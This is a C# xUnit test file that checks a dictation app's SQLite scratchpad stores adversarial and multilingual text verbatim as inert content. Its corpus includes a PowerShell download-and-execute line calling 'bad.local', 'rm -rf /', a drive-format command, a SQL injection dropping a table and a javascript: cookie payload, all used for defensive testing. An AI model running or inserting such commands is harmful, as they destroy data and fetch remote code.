using System;
using System.Text;
using System.Threading.Tasks;
using Flow.Core.Scratchpad;
using Flow.Core.Storage;
using Xunit;

namespace Flow.Core.Tests.Scratchpad;

public sealed class Phase9ScratchpadAdversarialCorpusTests
{
    [Theory]
    [InlineData("Normal prose paragraph discussing workflow efficiency and daily standups.")]
    [InlineData("open cmd and start administrator console")]
    [InlineData("run powershell -NoProfile -ExecutionPolicy Bypass -Command 'Get-Service'")]
    [InlineData("delete all files in directory C:\\Temp\\Data")]
    [InlineData("send this email to entire distribution group")]
    [InlineData("execute npm install --save-dev typescript @types/node")]
    [InlineData("press enter to submit form immediately")]
    [InlineData("public async Task<int> ExecuteSafeAsync(CancellationToken ct) => await Task.FromResult(42);")]
    [InlineData("C:\\Users\\barat\\OneDrive\\Desktop\\FLOW\\src\\Flow.Core\\Scratchpad\\ScratchpadModels.cs")]
    [InlineData("https://github.com/flow-voice/flow-windows-native?version=9.0&status=active#readme")]
    [InlineData("javascript:alert(document.cookie);")]
    [InlineData("rm -rf / --no-preserve-root && echo 'deleted'")]
    [InlineData("Bonjour le monde, ceci est un test de dictée vocale locale.")]
    [InlineData("வணக்கம், இது குரல் வழி உள்ளீடு சோதனையாகும்.")]
    [InlineData("नमस्ते, यह वॉयस टाइपिंग परीक्षण है।")]
    [InlineData("இந்த function-ஐ async Task என்று மாற்ற வேண்டும்.")]
    [InlineData("Unicode Math: ∀x ∈ ℝ, x² ≥ 0 ∧ ∑(1/n²) = π²/6 ∧ ₿ + € + £ + ¥ + ₹")]
    [InlineData("Emoji productivity: 🎙️ FLOW Voice Dictation 🚀 Fast & Offline 📌 Pinned note 👍")]
    [InlineData("Quotes: \"He said, 'Always verify before executing.'\" and «citation requise»")]
    [InlineData("Apostrophes: It's working, won't fail, O'Reilly's book on SQLite")]
    [InlineData("# Heading 1\n## Subheading\n* Bullet 1\n* Bullet 2\n> Blockquote\n`inline code`")]
    [InlineData("{\"model\": \"whisper-base\", \"offline\": true, \"latency_ms\": 320, \"tags\": [\"win32\", \"directml\"]}")]
    [InlineData("SELECT Id, Title FROM Scratchpads WHERE Id = '1' OR '1'='1'; DROP TABLE Scratchpads;--")]
    [InlineData("Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://bad.local')")]
    [InlineData("cmd.exe /c start /wait calc.exe && format D: /fs:ntfs /q")]
    [InlineData("[FLOW Docs](https://flow.local/docs/phase-9) and [Source](file:///C:/FLOW/src)")]
    public async Task AdversarialCorpus_A_to_W_PersistsVerbatimAndRemainsInertContent(string content)
    {
        using var db = new SqlitePersonalizationDatabase(":memory:");
        var repo = new SqliteScratchpadRepository(db);

        var entry = ScratchpadEntry.Create("Adversarial Sample", content);
        string id = await repo.InsertAsync(entry);

        var loaded = await repo.GetByIdAsync(id);
        Assert.NotNull(loaded);
        Assert.Equal(content, loaded.Content);
        Assert.Equal(content.Length, loaded.CharacterCount);

        // FTS Search can find word tokens from normal or multi-lingual text safely without SQL injection
        var searchPage = await repo.SearchAsync("FLOW");
        Assert.NotNull(searchPage);
    }

    [Fact]
    public async Task AdversarialCorpus_K_LongText_500KB_PersistsAndLoadsWithoutTruncation()
    {
        using var db = new SqlitePersonalizationDatabase(":memory:");
        var repo = new SqliteScratchpadRepository(db);

        var sb = new StringBuilder();
        for (int i = 0; i < 5000; i++)
        {
            sb.AppendLine($"Paragraph {i}: FLOW offline voice architecture ensures zero cloud transmission.");
        }
        string longContent = sb.ToString();

        var entry = ScratchpadEntry.Create("Large Document", longContent);
        string id = await repo.InsertAsync(entry);

        var loaded = await repo.GetByIdAsync(id);
        Assert.NotNull(loaded);
        Assert.Equal(longContent.Length, loaded.CharacterCount);
        Assert.Equal(longContent, loaded.Content);
    }

    [Fact]
    public async Task AdversarialCorpus_L_and_M_EmptyAndWhitespace_HandledDeterministically()
    {
        using var db = new SqlitePersonalizationDatabase(":memory:");
        var repo = new SqliteScratchpadRepository(db);

        var emptyEntry = ScratchpadEntry.Create("", "");
        string idEmpty = await repo.InsertAsync(emptyEntry);

        var whitespaceEntry = ScratchpadEntry.Create("   \t  \n ", "   \t\t \r\n\r\n   ");
        string idWs = await repo.InsertAsync(whitespaceEntry);

        var loadedEmpty = await repo.GetByIdAsync(idEmpty);
        Assert.NotNull(loadedEmpty);
        Assert.Equal("Untitled Scratchpad", loadedEmpty.Title);
        Assert.Equal(string.Empty, loadedEmpty.Content);
        Assert.Equal(0, loadedEmpty.WordCount);
        Assert.Equal(0, loadedEmpty.CharacterCount);

        var loadedWs = await repo.GetByIdAsync(idWs);
        Assert.NotNull(loadedWs);
        Assert.Equal("Untitled Scratchpad", loadedWs.Title);
        Assert.Equal(0, loadedWs.WordCount);
    }

    [Fact]
    public async Task AdversarialCorpus_X_VeryLongSingleLine_PersistsSafely()
    {
        using var db = new SqlitePersonalizationDatabase(":memory:");
        var repo = new SqliteScratchpadRepository(db);

        string longSingleLine = new string('X', 15000);
        var entry = ScratchpadEntry.Create("Single Line", longSingleLine);
        string id = await repo.InsertAsync(entry);

        var loaded = await repo.GetByIdAsync(id);
        Assert.NotNull(loaded);
        Assert.Equal(15000, loaded.CharacterCount);
        Assert.Equal(1, loaded.WordCount);
        Assert.Equal(longSingleLine, loaded.Content);
    }

    [Fact]
    public async Task AdversarialCorpus_Y_VeryLongMultiline_1000Lines_PersistsSafely()
    {
        using var db = new SqlitePersonalizationDatabase(":memory:");
        var repo = new SqliteScratchpadRepository(db);

        var sb = new StringBuilder();
        for (int i = 1; i <= 1000; i++)
        {
            sb.AppendLine($"Line {i}: Dictation note line item with numbers and words.");
        }
        string multilineContent = sb.ToString();

        var entry = ScratchpadEntry.Create("1000 Lines", multilineContent);
        string id = await repo.InsertAsync(entry);

        var loaded = await repo.GetByIdAsync(id);
        Assert.NotNull(loaded);
        Assert.Equal(multilineContent, loaded.Content);
        Assert.Equal(10000, loaded.WordCount); // 10 words per line * 1000
    }
}
